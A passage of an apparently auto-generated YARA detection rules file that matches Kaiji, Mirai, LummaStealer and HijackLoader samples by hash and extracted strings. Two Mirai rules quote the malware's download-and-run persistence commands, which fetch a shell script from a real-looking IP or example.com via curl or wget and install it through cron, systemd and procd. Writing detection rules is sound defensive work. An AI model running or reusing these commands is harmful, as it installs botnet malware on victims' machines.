      hash1 = "8895157c86f0f62ccc96c12ca064bb7cc1d311cbe94467fbe9895f3aa74b5f43"
      hash2 = "a82036bbe31274fd6c010f76f210d3c81dfbc47eb36843a9ce5e5ea50a6cd29f"
      hash3 = "af3c182144f6ec184bbae0429ffe5d29767cd82cec0410faf6fa3068b4551afb"
      hash4 = "bd7a37a86a1fa6831f426d1570f702aaffe454b4609eda5f111b7bd0f4d6da81"
      hash5 = "ded5e44044fbffebe6a1beb9d66f8c9282cbf7cef065d8231244997f0829a84e"
   strings:
      $s1 = "runtime.fdiv64" fullword ascii /* score: '10.00'*/
      $s2 = "runtime.fge64" fullword ascii /* score: '10.00'*/
      $s3 = "runtime.funpack64" fullword ascii /* score: '10.00'*/
      $s4 = "runtime.fadd64" fullword ascii /* score: '10.00'*/
      $s5 = "runtime.fgt64" fullword ascii /* score: '10.00'*/
      $s6 = "mSpanManualmethodargs(minTrigger=netpollInitnil contextread port: reflect.SetreflectOffsretry-afterrunterminalruntime: P runtime" ascii /* score: '10.00'*/
      $s7 = "runtime.fcmp64" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.fuint64to64" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.feq64" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.funpack32" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.feq32" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.fintto64" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.fint64to64" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.fint32to64" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.fmul64" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Kaiji_signature__78e6c917_Kaiji_signature__7cab2814_Kaiji_signature__8895157c_Kaiji_signature__af3c1821_63 {
   meta:
      description = "_subset_batch - from files Kaiji(signature)_78e6c917.elf, Kaiji(signature)_7cab2814.elf, Kaiji(signature)_8895157c.elf, Kaiji(signature)_af3c1821.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "78e6c917b26061148d6a1f589521c9a91cb3c35d7263b046bbbfb08e7ad43c34"
      hash2 = "7cab2814a06c64a3cacd86d90222f469c67a4c9ff927c8fc0b262f8a667b2992"
      hash3 = "8895157c86f0f62ccc96c12ca064bb7cc1d311cbe94467fbe9895f3aa74b5f43"
      hash4 = "af3c182144f6ec184bbae0429ffe5d29767cd82cec0410faf6fa3068b4551afb"
   strings:
      $x1 = "http: ContentLength=%d with Body length %dinsufficient data for resource body lengthmix of request and response pseudo headersno" ascii /* score: '57.50'*/
      $s2 = "d criteria: invalid hostname: multihop attemptedno child processesno locks availablenon-minimal lengthoperation canceledpermessa" ascii /* score: '28.00'*/
      $s3 = "ncatedserver misbehavingstopping the worldstreams pipe errorsync.RWMutex.RLocksystem page size (tracebackancestorstruncated sequ" ascii /* score: '23.00'*/
      $s4 = ":[_outboundatomicor8attempts:bad indirbad prunebus errorchan sendchkconfigcomplex64continuedcopystackctxt != 0d.nx != 0dns,files" ascii /* score: '17.00'*/
      $s5 = "empty urlfiles,dnsfork/execfuncargs(function hchanLeafinittraceinterfaceinterruptinvalid nipv6-icmplocalhostlocaltimemSpanDeadne" ascii /* score: '16.00'*/
      $s6 = "type:.eq.os.ProcessState" fullword ascii /* score: '15.00'*/
      $s7 = "adaptivestackstartbad Content-Lengthbad lfnode addressbad manualFreeListbad point length: bufio: buffer fullcleantimers: bad pco" ascii /* score: '14.00'*/
      $s8 = "not remap pages in address spaceruntime: lfstack.push invalid packing: node=span on userArena.faultList has invalid sizetls: ser" ascii /* score: '13.00'*/
      $s9 = " gp: gp=runtime: getg:  g=runtime: npages = runtime: range = {runtime: textAddr sec-ch-ua-platformsegmentation faultsequence tru" ascii /* score: '12.00'*/
      $s10 = "type:.eq.runtime.sysmontick" fullword ascii /* score: '11.00'*/
      $s11 = "nnection refusedcontext.Backgrounddecoding error: %vexport restrictionfile name too longforEachP: not doneframe_goaway_shortgarb" ascii /* score: '10.00'*/
      $s12 = "age collectionhttp: no such fileidentifier removedindex out of rangeinput/output errorinstruction bytes:invalid character invali" ascii /* score: '10.00'*/
      $s13 = "C:/Program Files/Go/src/runtime/hash64.go" fullword ascii /* score: '10.00'*/
      $s14 = "enceunexpected messageunknown time zone use of closed filevalue out of range (%d bytes omitted) (abnormal closure) (policy viola" ascii /* score: '10.00'*/
      $s15 = "ge-deflateproxy-authenticatereceived from peerreflect.Value.Elemreflect.Value.Typereflect.Value.Uintreflect: Zero(nil)runtime:  " ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Mirai_signature__11bcd56a_Mirai_signature__180d9d0e_Mirai_signature__19e62b77_64 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_11bcd56a.elf, Mirai(signature)_180d9d0e.elf, Mirai(signature)_19e62b77.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "11bcd56afbf36da794f6dea6e502005528c17659a4a36cbaf32c526ce1ed5234"
      hash2 = "180d9d0e774ec7b777d80113096ab47ef630308c626bf99f1c03cf80e1ccef24"
      hash3 = "19e62b77d21ddb588294e3254c61aa1f3475475903b0165b3dad4ac0e2886ca5"
   strings:
      $s1 = "HTTP.GET" fullword ascii /* score: '18.00'*/
      $s2 = "GET /%s?%s HTTP/1.1" fullword ascii /* score: '15.00'*/
      $s3 = "GET %s?%s HTTP/1.1" fullword ascii /* score: '15.00'*/
      $s4 = "HTTP.OVH" fullword ascii /* score: '13.00'*/
      $s5 = "parse_command" fullword ascii /* score: '12.00'*/
      $s6 = "attack_http_get" fullword ascii /* score: '12.00'*/
      $s7 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0" fullword ascii /* score: '9.00'*/
      $s8 = "make_ip_header" fullword ascii /* score: '9.00'*/
      $s9 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s10 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/96.0.1054.62" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( all of them )
      ) or ( all of them )
}

rule _Kaiji_signature__Kaiji_signature__a82036bb_Kaiji_signature__bd7a37a8_Kaiji_signature__c6c0da6a_Kaiji_signature__ded5e440_Ka_65 {
   meta:
      description = "_subset_batch - from files Kaiji(signature).elf, Kaiji(signature)_a82036bb.elf, Kaiji(signature)_bd7a37a8.elf, Kaiji(signature)_c6c0da6a.elf, Kaiji(signature)_ded5e440.elf, Kaiji(signature)_eec9b44f.elf, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash).exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_179bdf50.exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_3c2ef69a.exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_7935d548.exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_9e4a0b96.exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_a7270dd3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "aead4ac6bea6859316dce9aeda0d704e05293466dde897247c7c32cb32c6a4e1"
      hash2 = "a82036bbe31274fd6c010f76f210d3c81dfbc47eb36843a9ce5e5ea50a6cd29f"
      hash3 = "bd7a37a86a1fa6831f426d1570f702aaffe454b4609eda5f111b7bd0f4d6da81"
      hash4 = "c6c0da6a5a6c95627c240816ab46ccf88b5e661c59827c33e9af6ef4080855d8"
      hash5 = "ded5e44044fbffebe6a1beb9d66f8c9282cbf7cef065d8231244997f0829a84e"
      hash6 = "eec9b44f6de1f6157457edc8da37f9813a75b3176c61f89b7aa78dcdf7890892"
      hash7 = "8ad7cbc9e16fe872a2296b32cdcc52744969b90fb400abcec7ab24a853c2f36b"
      hash8 = "179bdf50eba7b0927eae4104945cd4e5fe66ef77d89f9a693cadb13fa78e6ab5"
      hash9 = "3c2ef69aea6cb66957fb694c4aec987b9df428698be5336b3ac4b4acdbe122b6"
      hash10 = "7935d54819db8a8e3a92ad06a95496a1884d368d27e3af2bc4e7ba3e2e49c952"
      hash11 = "9e4a0b96a349285d56db12ff601ef94e16da03c5a71460995d218e4a84b17c63"
      hash12 = "a7270dd368ccee242cdfcc13b7b4993d3eee78ab3981e04b96ba2d2e33f8eb3b"
   strings:
      $s1 = "runtime.mapassign_fast32ptr" fullword ascii /* score: '13.00'*/
      $s2 = "sync/atomic.CompareAndSwapUint64" fullword ascii /* score: '11.00'*/
      $s3 = "runtime.uint64mod" fullword ascii /* score: '10.00'*/
      $s4 = "runtime.panicExtendSliceB" fullword ascii /* score: '10.00'*/
      $s5 = "runtime.slowdodiv" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.mix32" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.panicExtendIndexU" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.int64div" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.goPanicExtendIndexU" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.goPanicExtendSliceB" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.int64mod" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.uint64div" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.dodiv" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 17000KB and pe.imphash() == "1aae8bf580c846f39c71c05898e57e88" and ( 8 of them )
      ) or ( all of them )
}

rule _Kaiji_signature__a82036bb_Kaiji_signature__bd7a37a8_Kaiji_signature__c6c0da6a_Kaiji_signature__ded5e440_Kaiji_signature__ee_66 {
   meta:
      description = "_subset_batch - from files Kaiji(signature)_a82036bb.elf, Kaiji(signature)_bd7a37a8.elf, Kaiji(signature)_c6c0da6a.elf, Kaiji(signature)_ded5e440.elf, Kaiji(signature)_eec9b44f.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a82036bbe31274fd6c010f76f210d3c81dfbc47eb36843a9ce5e5ea50a6cd29f"
      hash2 = "bd7a37a86a1fa6831f426d1570f702aaffe454b4609eda5f111b7bd0f4d6da81"
      hash3 = "c6c0da6a5a6c95627c240816ab46ccf88b5e661c59827c33e9af6ef4080855d8"
      hash4 = "ded5e44044fbffebe6a1beb9d66f8c9282cbf7cef065d8231244997f0829a84e"
      hash5 = "eec9b44f6de1f6157457edc8da37f9813a75b3176c61f89b7aa78dcdf7890892"
   strings:
      $x1 = "flate: internal error: frame_goaway_has_streamframe_headers_pad_shortframe_rststream_bad_lengarbage collection scangcDrain phase" ascii /* score: '35.00'*/
      $x2 = " MB,  and  got= max= ms,  ptr  tab= top=%s %q%s-%s(nil), fp:--add/.mod/d');/proc/stat/tmp/15625326753267678125:***@:path<nil>Adl" ascii /* score: '31.50'*/
      $s3 = "value=abortedaccept4androidanswerschtimeschunkedconnectcpuprofderivedexpiresfloat32float64forcegcfstatatgctracehead = invalidips" ascii /* score: '28.00'*/
      $s4 = " MB,  and  got= max= ms,  ptr  tab= top=%s %q%s-%s(nil), fp:--add/.mod/d');/proc/stat/tmp/15625326753267678125:***@:path<nil>Adl" ascii /* score: '19.50'*/
      $s5 = "rk.nprocx509: invalid key usagex509: malformed UTCTimex509: malformed version (internal server error) { proc_name=$(/usr/bin//us" ascii /* score: '18.00'*/
      $s6 = "agebincgodirdnsendfinftpgc gp in intkeymapnilobjpc=ptrsetsshtcpudpvia{0}{A}{a}" fullword ascii /* score: '15.00'*/
      $s7 = "angeRealmRunicSHA-1SHELLSTermTakriTamilTypeA] = (arraybad nchdirchmodclosecronddeferdeny" fullword ascii /* score: '14.00'*/
      $s8 = "  minutes nalloc= newval= nfreed= ping=%q pointer stack=[ status %!Month() errno=/gid_map/uid_map/var/run2.5.4.102.5.4.112.5.4.1" ascii /* score: '12.00'*/
      $s9 = "netpoll failedruntime: s.allocCount= s.allocCount > s.nelemsschedule: holding lockssegment length too longshrinkstack at bad tim" ascii /* score: '10.00'*/
      $s10 = "runtime.mulUintptr" fullword ascii /* score: '10.00'*/
      $s11 = "l errorno-reloadomitemptypanicwaitpreemptedprintableprofBlockprotocol questionsrecover: reflect: rwxrwxrwxscavtracesec-ch-uaseei" ascii /* score: '10.00'*/
      $s12 = "ntlogsignal 32signal 33signal 34signal 35signal 36signal 37signal 38signal 39signal 40signal 41signal 42signal 43signal 44signal" ascii /* score: '9.00'*/
      $s13 = "eskipping Question Classspan has no free stacksstack growth after forksyntax error in patternsystem huge page size (too many poi" ascii /* score: '9.00'*/
      $s14 = "nters (>10)truncated tag or lengthunexpected address typeunexpected signal valueunknown error code 0x%xunlock of unlocked lockun" ascii /* score: '9.00'*/
      $s15 = "iredreflect.Value.Interfacereflect.Value.NumMethodreflect.methodValueCallruntime/internal/atomicruntime: internal errorruntime: " ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Mirai_signature__100e0eb8_Mirai_signature__142ac936_Mirai_signature__1b42c968_67 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_100e0eb8.elf, Mirai(signature)_142ac936.elf, Mirai(signature)_1b42c968.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "100e0eb8f8e79c69ad97e36e542700bb8e1b83986de9b0a65e8e80c92a8cee7f"
      hash2 = "142ac936b9784e7b4ab66894312833684f55de981ef08e367130e20dc2257b43"
      hash3 = "1b42c96817bc2176345953b1049ed126e3f82e01e52afba63562c72132bab2e4"
   strings:
      $x1 = "ExecStart=/bin/sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then s" ascii /* score: '53.00'*/
      $x2 = "ExecStart=/bin/sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then s" ascii /* score: '50.00'*/
      $x3 = "(crontab -l 2>/dev/null | grep -v 'uraskid' ; echo '@reboot for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell." ascii /* score: '45.00'*/
      $x4 = "    procd_set_param command sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s" ascii /* score: '44.00'*/
      $x5 = "for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; break" ascii /* score: '38.00'*/
      $x6 = "for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; break" ascii /* score: '38.00'*/
      $x7 = "askid | grep -v grep >/dev/null || (for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -" ascii /* score: '38.00'*/
      $x8 = "    procd_set_param command sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s" ascii /* score: '36.00'*/
      $x9 = "$t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; break; fi; rm -f $T; done; %s skidstart') | " ascii /* score: '36.00'*/
      $x10 = "(crontab -l 2>/dev/null | grep -v 'uraskid' ; echo '@reboot for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell." ascii /* score: '35.00'*/
      $x11 = "    for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; b" ascii /* score: '33.00'*/
      $x12 = "    for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; b" ascii /* score: '33.00'*/
      $s13 = "      if $tool 'https://example.com/script.sh' > \"$TEMP_SCRIPT\" 2>/dev/null && [ -s \"$TEMP_SCRIPT\" ]; then" fullword ascii /* score: '30.00'*/
      $s14 = "        if $tool 'https://example.com/script.sh' > \"$TEMP_SCRIPT\" 2>/dev/null && [ -s \"$TEMP_SCRIPT\" ]; then" fullword ascii /* score: '30.00'*/
      $s15 = "s $T ]; then sh $T&; rm -f $T; break; fi; rm -f $T; done; %s skidstart)' ; echo '@hourly for t in curl wget; do T=/tmp/.s$$; if " ascii /* score: '23.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 900KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _Mirai_signature__1349ebd3_Mirai_signature__16b7eb2d_Mirai_signature__19adf628_68 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_1349ebd3.elf, Mirai(signature)_16b7eb2d.elf, Mirai(signature)_19adf628.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1349ebd3abb6414201588c32d768af7aba59dedf21fc817b872364406f8567e9"
      hash2 = "16b7eb2d1f077ce1198a67b98bcb7caccd9511dd10bc39ea285aa2fba89be5d2"
      hash3 = "19adf6285b1504c96400173287c0b0bdb8d0e071c3dff9706a67ea36a6e543a4"
   strings:
      $x1 = "ExecStart=/bin/sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then " ascii /* score: '51.00'*/
      $x2 = "ExecStart=/bin/sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then " ascii /* score: '48.00'*/
      $x3 = "(crontab -l 2>/dev/null | grep -v 'uraskid' ; echo '@reboot for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell" ascii /* score: '43.00'*/
      $x4 = "    procd_set_param command sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -" ascii /* score: '42.00'*/
      $x5 = "raskid | grep -v grep >/dev/null || (for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [" ascii /* score: '36.00'*/
      $x6 = "for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; brea" ascii /* score: '36.00'*/
      $x7 = "for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; brea" ascii /* score: '36.00'*/
      $x8 = "    procd_set_param command sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -" ascii /* score: '34.00'*/
      $x9 = "(crontab -l 2>/dev/null | grep -v 'uraskid' ; echo '@reboot for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell" ascii /* score: '33.00'*/
      $x10 = "    for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; " ascii /* score: '31.00'*/
      $x11 = "f $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; break; fi; rm -f $T; done; %s skidstart')" ascii /* score: '31.00'*/
      $x12 = "    for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; " ascii /* score: '31.00'*/
      $s13 = "      if $tool 'http://94.154.35.154/script.sh' > \"$TEMP_SCRIPT\" 2>/dev/null && [ -s \"$TEMP_SCRIPT\" ]; then" fullword ascii /* score: '28.00'*/
      $s14 = "        if $tool 'http://94.154.35.154/script.sh' > \"$TEMP_SCRIPT\" 2>/dev/null && [ -s \"$TEMP_SCRIPT\" ]; then" fullword ascii /* score: '28.00'*/
      $s15 = "s $T ]; then sh $T&; rm -f $T; break; fi; rm -f $T; done; exec %s skidstart'" fullword ascii /* score: '23.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 900KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _HijackLoader_signature__d8b31f8c03e0c76ff245ed05a15ffe6c_imphash__Kaiji_signature__Kaiji_signature__78e6c917_Kaiji_signatur_69 {
   meta:
      description = "_subset_batch - from files HijackLoader(signature)_d8b31f8c03e0c76ff245ed05a15ffe6c(imphash).exe, Kaiji(signature).elf, Kaiji(signature)_78e6c917.elf, Kaiji(signature)_7cab2814.elf, Kaiji(signature)_8895157c.elf, Kaiji(signature)_a82036bb.elf, Kaiji(signature)_af3c1821.elf, Kaiji(signature)_bd7a37a8.elf, Kaiji(signature)_c6c0da6a.elf, Kaiji(signature)_ded5e440.elf, Kaiji(signature)_eec9b44f.elf, LummaStealer(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "aa59b9a8c2a1121e10d0bf939fc255b2ddd213fce8b1bba3c8ef84632be02aa3"
      hash2 = "aead4ac6bea6859316dce9aeda0d704e05293466dde897247c7c32cb32c6a4e1"
      hash3 = "78e6c917b26061148d6a1f589521c9a91cb3c35d7263b046bbbfb08e7ad43c34"
      hash4 = "7cab2814a06c64a3cacd86d90222f469c67a4c9ff927c8fc0b262f8a667b2992"
      hash5 = "8895157c86f0f62ccc96c12ca064bb7cc1d311cbe94467fbe9895f3aa74b5f43"
      hash6 = "a82036bbe31274fd6c010f76f210d3c81dfbc47eb36843a9ce5e5ea50a6cd29f"
      hash7 = "af3c182144f6ec184bbae0429ffe5d29767cd82cec0410faf6fa3068b4551afb"
      hash8 = "bd7a37a86a1fa6831f426d1570f702aaffe454b4609eda5f111b7bd0f4d6da81"
      hash9 = "c6c0da6a5a6c95627c240816ab46ccf88b5e661c59827c33e9af6ef4080855d8"
      hash10 = "ded5e44044fbffebe6a1beb9d66f8c9282cbf7cef065d8231244997f0829a84e"
      hash11 = "eec9b44f6de1f6157457edc8da37f9813a75b3176c61f89b7aa78dcdf7890892"
      hash12 = "16db153e6a6d2c5fa1a2899929163feebe3d29d61fb22c9cdae06cb916fc6eb4"
   strings:
      $s1 = "runtime.headTailIndex.head" fullword ascii /* score: '15.00'*/
      $s2 = "runtime.makeHeadTailIndex" fullword ascii /* score: '15.00'*/
      $s3 = "runtime.headTailIndex.split" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.finalizercommit" fullword ascii /* score: '13.00'*/
      $s5 = "type:.eq.runtime.mOS" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.assertE2I" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.removespecial" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.SetFinalizer.func2" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.SetFinalizer" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.createfing" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.assertE2I2" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.removefinalizer" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.convT64" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.addfinalizer" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.SetFinalizer.func1" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 17000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Kaiji_signature__8895157c_Kaiji_signature__a82036bb_Kaiji_signature__af3c1821_Kaiji_signature__bd7a37a8_Kaiji_signature__c6_70 {
   meta:
      description = "_subset_batch - from files Kaiji(signature)_8895157c.elf, Kaiji(signature)_a82036bb.elf, Kaiji(signature)_af3c1821.elf, Kaiji(signature)_bd7a37a8.elf, Kaiji(signature)_c6c0da6a.elf, Kaiji(signature)_ded5e440.elf, Kaiji(signature)_eec9b44f.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8895157c86f0f62ccc96c12ca064bb7cc1d311cbe94467fbe9895f3aa74b5f43"
      hash2 = "a82036bbe31274fd6c010f76f210d3c81dfbc47eb36843a9ce5e5ea50a6cd29f"
      hash3 = "af3c182144f6ec184bbae0429ffe5d29767cd82cec0410faf6fa3068b4551afb"
      hash4 = "bd7a37a86a1fa6831f426d1570f702aaffe454b4609eda5f111b7bd0f4d6da81"
      hash5 = "c6c0da6a5a6c95627c240816ab46ccf88b5e661c59827c33e9af6ef4080855d8"
      hash6 = "ded5e44044fbffebe6a1beb9d66f8c9282cbf7cef065d8231244997f0829a84e"
      hash7 = "eec9b44f6de1f6157457edc8da37f9813a75b3176c61f89b7aa78dcdf7890892"
   strings:
      $x1 = " text=  zombie% CPU (%s%s|%s(PANIC=, goid=, j0 = , time.,errno=-070000. Got: /bin/sh19531252.5.4.32.5.4.52.5.4.62.5.4.72.5.4.82." ascii /* score: '39.00'*/
      $s2 = "chan<-cookiedomainefenceerrno exec: expectgopherhangupheaderinternip+netkilledlistenminutendots:netdnsobjectonlineoriginremovere" ascii /* score: '29.50'*/
      $s3 = " text=  zombie% CPU (%s%s|%s(PANIC=, goid=, j0 = , time.,errno=-070000. Got: /bin/sh19531252.5.4.32.5.4.52.5.4.62.5.4.72.5.4.82." ascii /* score: '23.00'*/
      $s4 = "sanElymaicEnd*-*-ExpiresGODEBUGGranthaHEADERSHTTP/1.HanunooIM UsedINVALIDIO waitJanuaryKannadaMD2-RSAMD5-RSAMakasarMandaicMarche" ascii /* score: '21.00'*/
      $s5 = " Int63ninvalid port %q after hostinvalid request descriptorinvalid use of gostartcallmalformed HTTP status codemalformed chunked" ascii /* score: '17.00'*/
      $s6 = "pooflookup minpc= netstatnil keynumericopenbsdoptionspacer: panic: privaterefererrefreshrunningserial:servicesignal solarisstopp" ascii /* score: '13.00'*/
      $s7 = "5.4.99765625: type ::ffff::method:scheme:status<<RMS>>AvestanBengaliBrailleCONNECTChanDirCookie2CreatedCypriotDeseretEd25519Elba" ascii /* score: '12.00'*/
      $s8 = "ogdianSoyomboSubjectSwapperTagalogTibetanTirhutaTrailerTuesdayTypeALLTypeOPTTypePTRTypeSOATypeSRVTypeTXTTypeWKSUNKNOWNUpgradeVer" ascii /* score: '9.00'*/
      $s9 = "value=abortedaccept4androidanswerschtimeschunkedconnectcpuprofderivedexpiresfloat32float64forcegcfstatatgctracehead = invalidips" ascii /* score: '9.00'*/
      $s10 = "namerenicereturnsecondselectserversocketsocks5splicestatusstringstructsweep sysmontelnettimerstls13 uint16uint32uint64waitidwrit" ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _Mirai_signature__0052d359_Mirai_signature__033cd9aa_Mirai_signature__038983a7_Mirai_signature__03ea04af_Mirai_signature__04_71 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_0052d359.elf, Mirai(signature)_033cd9aa.elf, Mirai(signature)_038983a7.elf, Mirai(signature)_03ea04af.elf, Mirai(signature)_042aca85.elf, Mirai(signature)_05bdf042.elf, Mirai(signature)_06d01c29.elf, Mirai(signature)_06d264bc.elf, Mirai(signature)_0729e659.elf, Mirai(signature)_07d77f6e.elf, Mirai(signature)_0c39b52c.elf, Mirai(signature)_0c78114c.elf, Mirai(signature)_0d99ad98.elf, Mirai(signature)_0dadbc90.elf, Mirai(signature)_0dd239f6.elf, Mirai(signature)_0eeb92ea.elf, Mirai(signature)_101ceae5.elf, Mirai(signature)_114183b0.elf, Mirai(signature)_13769e69.elf, Mirai(signature)_13e370ad.elf, Mirai(signature)_144040da.elf, Mirai(signature)_14a44349.elf, Mirai(signature)_15a7975e.elf, Mirai(signature)_16a75c55.elf, Mirai(signature)_16dc0fdf.elf, Mirai(signature)_1765e655.elf, Mirai(signature)_1aa3314d.elf, Mirai(signature)_1b9e2c13.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0052d359df89257e8b0975db343e1285554b28ef45b8df7eaf395e02b00908f5"
      hash2 = "033cd9aa62ca6980985ef7cce094d45525988a3991218d8e524bcd81dec4d7c7"
      hash3 = "038983a790ae2817051581bcf87c3969c262f3cb384d558a4fb990dc84783d6e"
      hash4 = "03ea04af011a578e2e0532087517f2194aa5e886bef9c6dce7e140a04a63ef1c"
      hash5 = "042aca85b7dcc5d85050e85d169481e44640a63b2a189df1a9d045855a329497"
      hash6 = "05bdf042cb2c7351d93378a105c2a78929b59ecc22df66bc1130f7a0798d17f1"
      hash7 = "06d01c29698173e390c98e97a1f59bf8c5b9b67acf501c5097f18330969da016"
      hash8 = "06d264bc67d4db978d520f3fbb932e8dc9d79fba0a529fa1773a93eadcd574ee"
      hash9 = "0729e6598e04e70a3d468aef8efb9cdf343b1b12663254bc65e6a5152dd1e127"
      hash10 = "07d77f6e812e5c28db6686b5d9f2f31eb154d1a4149b2d8c602a0f61d15893ff"
      hash11 = "0c39b52ce1ad1873e0db99dbceaa42fad3d3832d02e48321d2f38f5e8d1ce59e"
      hash12 = "0c78114cfef3f035568e35480bb725c7521c3cd4e9023244cd9372921e6d4c16"
      hash13 = "0d99ad98a68c10d75f4a77c08727896bf03ddb3faa08af7b0058691097e04a31"
